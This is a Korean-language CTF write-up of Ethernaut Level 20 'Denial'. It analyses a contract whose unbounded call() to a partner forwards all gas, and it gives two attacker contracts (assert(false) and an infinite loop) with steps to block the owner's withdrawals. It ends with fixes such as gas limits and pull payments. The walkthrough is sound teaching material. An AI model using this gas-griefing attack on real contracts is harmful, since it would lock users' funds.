# Ethernaut Level 20 - Denial

## 문제 설명

`withdraw()` 함수가 영원히 실패하도록 만들어 owner가 출금할 수 없게 하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Denial {
    address public partner;
    address public constant owner = address(...);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances;

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        partner.call{value: amountToSend}("");   // ← 가스 한도 미지정
        payable(owner).transfer(amountToSend);
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    receive() external payable {}
}
```

---

## 취약점 분석

### 가스 한도 미지정

```solidity
partner.call{value: amountToSend}("");
```

`call()`은 기본적으로 **남은 가스를 전부 전달**한다.

파트너 컨트랙트에서 가스를 전부 소모하면:
- `owner.transfer()` 실행 전에 가스 부족
- 트랜잭션 전체 revert
- owner는 영원히 출금 불가

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    // 방법 1: assert로 가스 전부 소모
    receive() external payable {
        assert(false);
    }
}
```

```solidity
// 방법 2: 무한루프로 가스 소모
contract DenialAttack {
    receive() external payable {
        uint i = 0;
        while (true) {
            i++;
        }
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

### Step 2 — partner로 등록

```js
await contract.setWithdrawPartner("공격컨트랙트주소")
```

### Step 3 — 확인

```js
await contract.partner()
// → 공격 컨트랙트 주소

// withdraw() 호출 시 가스 부족으로 실패 확인
```

---

## 핵심 교훈

```solidity
// ❌ 위험 - 가스 한도 미지정
partner.call{value: amountToSend}("");

// ✅ 안전 - 가스 한도 지정
partner.call{value: amountToSend, gas: 2300}("");

// ✅ 또는 transfer 사용 (2300 gas만 전달)
payable(partner).transfer(amountToSend);
```

- 외부 `call()` 시 반드시 가스 한도 지정
- Pull Payment 패턴으로 수신자가 직접 인출하도록 유도
